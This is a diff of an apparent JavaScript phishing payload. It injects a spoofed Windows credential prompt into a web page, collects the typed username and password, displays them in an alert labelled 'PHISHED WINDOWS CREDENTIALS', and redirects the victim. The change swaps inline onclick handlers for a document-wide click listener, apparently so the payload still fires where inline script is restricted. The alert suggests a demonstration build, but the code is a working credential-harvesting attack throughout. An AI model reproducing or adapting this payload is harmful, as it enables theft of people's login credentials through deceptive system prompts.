@@ -66,7 +66,7 @@ const phishHtml = `
     <p style="margin-left: 12px; margin-top: 16px;"><input class="textbox73" type="text" name="username" id="username" placeholder="Email address" size="32" autofocus></p>
     <p style="margin-left: 12px; margin-top: 10px;"><input class="textbox73" type="password" name="password" id="password" placeholder="Password" size="32"></p>
     <p style="margin-left: 8px; margin-top: 14px; user-select: none;"><label class="checkbox73"><input type="checkbox" name="checkbox" id="checkbox"><span class="checkmark73"></span></label><label style="color: #333333; line-height: 1.166; margin-left: 6px; font-size: 12px; vertical-align: super;">Remember my credentials</label></p>
-    <p style="margin-left: 12px; margin-top: 30px;"><input class="button73" type="button" name="okbutton" id="okbutton" value="OK" onclick="submitLoginForm()"><input class="button73" type="button" value="Cancel" onclick="submitLoginForm()"></p>
+    <p style="margin-left: 12px; margin-top: 30px;"><input class="button73" type="button" name="okbutton" id="okbutton" value="OK"><input class="button73" type="button" name="cancelbutton" id="cancelbutton" value="Cancel"></p>
   </form>
 </div>
 `;
@@ -77,6 +77,11 @@ async function submitLoginForm() {
   alert('PHISHED WINDOWS CREDENTIALS:\n   Username: ' + username + '\n   Password: ' + password);
   window.open(redirURL, '_self');
 }
+document.addEventListener("click", function(e) {
+  if ((e.target.id === "okbutton") || (e.target.id === "cancelbutton")) {
+    submitLoginForm();
+  }
+});
 function execPayld() {
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
